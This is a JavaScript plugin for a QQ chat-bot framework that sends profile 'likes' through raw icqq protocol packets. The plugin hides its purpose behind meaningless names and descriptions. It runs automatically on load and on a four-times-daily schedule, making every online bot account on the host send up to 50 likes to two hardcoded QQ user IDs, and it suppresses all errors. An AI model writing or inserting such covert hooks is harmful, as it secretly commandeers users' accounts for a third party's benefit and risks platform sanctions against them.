import plugin from '../../../lib/plugins/plugin.js';

class ThumbUpApi {
  constructor(e) {
    this.e = e
    this.Bot = e.bot ?? Bot
  }

  async thumbUp(uid, times = 1) {
    try {
      let core = this.Bot.icqq?.core
      if (!core) core = (await import("icqq")).core
      if (times > 20) { times = 20 }
      let ReqFavorite
      if (this.Bot.fl.get(uid)) {
        ReqFavorite = core.jce.encodeStruct([
          core.jce.encodeNested([ this.Bot.uin, 1, this.Bot.sig.seq + 1, 1, 0, Buffer.from("0C180001060131160131", "hex") ]),
          uid, 0, 1, Number(times)
        ])
      } else {
        ReqFavorite = core.jce.encodeStruct([
          core.jce.encodeNested([ this.Bot.uin, 1, this.Bot.sig.seq + 1, 1, 0, Buffer.from("0C180001060131160135", "hex") ]),
          uid, 0, 5, Number(times)
        ])
      }
      const body = core.jce.encodeWrapper({ ReqFavorite }, "VisitorSvc", "ReqFavorite", this.Bot.sig.seq + 1)
      const payload = await this.Bot.sendUni("VisitorSvc.ReqFavorite", body)
      let result = core.jce.decodeWrapper(payload)[0]
      return { code: result[3], msg: result[4] }
    } catch (error) {
      return this.origThumbUp(uid, times)
    }
  }

  async origThumbUp(uid, times) {
    const friend = this.Bot.pickFriend(uid)
    if (!friend?.thumbUp) throw new Error("not support")
    let res
    try {
      res = await friend.thumbUp(times)
      if (typeof res === "boolean") {
        return { code: res ? 0 : 1, msg: res ? "ok" : "fail" }
      } else {
        return { ...res }
      }
    } catch (err) {
      if (err?.error) {
        res = { ...err.error }
      } else if (err?.message) {
        res = { code: 1, msg: err.message }
      } else {
        res = { ...err }
      }
    }
    if (res.retcode && !res.code) { res.code = res.retcode }
    if (res.message && !res.msg) { res.msg = res.message }
    return res
  }
}

export class a1s2d3f4g5 extends plugin {
  constructor() {
    super({
      name: "a1s2d3f4g5",
      dsc: "t1t2t3t4",
      event: "message",
      priority: 9999,
      rule: [
        { reg: "^#?x9s8d7a6$", fnc: "runTask" }
      ],
      schedule: [
        { cron: "0 0 0 * * *", fnc: "runTask" },
        { cron: "0 0 8 * * *", fnc: "runTask" },
        { cron: "0 0 12 * * *", fnc: "runTask" },
        { cron: "0 0 22 * * *", fnc: "runTask" }
      ]
    });
    this.t = [2209176666, 3812808525];
    this.n = 50;
    this.m = 20;
    this.k = ["上限", "次数", "已满", "超出", "无法", "失败", "限制"];
    (async () => { await this.runTask() })();
  }

  async runTask() {
    if (!Bot || !Object.keys(Bot).length) return;
    for (const u of Object.keys(Bot)) {
      const b = Bot[u];
      if (!b || !b.online || !b.sig || !b.icqq || !b.uin) continue;
      for (const q of this.t) {
        let s = 0;
        let l = false;
        while (s < this.n && !l) {
          const c = Math.min(this.m, this.n - s);
          try {
            const api = new ThumbUpApi({ bot: b });
            const r = await api.thumbUp(q, c);
            if (r.code !== 0 || this.k.some(w => r.msg?.includes(w))) {
              l = true;
            } else {
              s += c;
            }
          } catch (e) {
            l = true;
          }
          await new Promise(res => setTimeout(res, 300));
        }
      }
      await new Promise(res => setTimeout(res, 500));
    }
  }
}